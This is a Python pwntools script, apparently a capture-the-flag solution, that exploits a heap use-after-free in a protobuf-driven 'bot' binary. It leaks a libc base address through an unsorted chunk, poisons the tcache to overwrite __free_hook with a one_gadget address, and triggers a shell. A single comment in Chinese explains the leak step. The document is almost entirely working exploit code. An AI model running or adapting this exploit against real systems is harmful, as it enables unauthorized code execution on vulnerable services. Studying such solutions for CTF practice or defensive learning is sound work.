from pwn import *
import message_pb2 as pb
# r = process('./bot')
r = remote("0.0.0.0", 10001)
e = ELF('./bot')
libc = ELF('./libc.so.6')
context.log_level = 'debug'


def repeater(idx, len, content):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = 'admin'
    msg.len = len
    msg.content = content
    msg.actionid = 0
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def add(idx, len, content=b'c_lby'):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = len
    msg.content = content
    msg.actionid = 1
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def delete(idx):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = 1
    msg.content = b'c_lby'
    msg.actionid = 2
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def show(idx):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = 1
    msg.content = b'c_lby'
    msg.actionid = 3
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


def edit(idx, content):
    msg = pb.Message_request()
    msg.id = idx
    msg.sender = b'admin'
    msg.len = 1
    msg.content = content
    msg.actionid = 4
    r.sendafter(b'TESTTESTTEST!\n', msg.SerializeToString())


add(0, 0x500)
add(1, 0x18)
add(2, 0x480)  # unpack会申请堆地址，所以第一个unsortedchunk会被分割，用原本的ptr中存的地址是打印不出来libc地址的。虽然会打印0x500个，但是为了方便，还是再申请一个unsortedchunk来泄露libc地址。
add(3, 0x18)
delete(0)
delete(2)
show(2)

libc_base = u64(r.recv(6).ljust(8, b'\x00'))-0x1ECFF0
log.info('libc_base:'+hex(libc_base))

add(5, 0x70)
add(6, 0x70)
delete(5)
delete(6)
edit(6, p64(libc_base+libc.symbols['__free_hook']))

add(7, 0x70)
add(8, 0x70, p64(libc_base+0xe3afe))

delete(7)  # getshell

r.interactive()
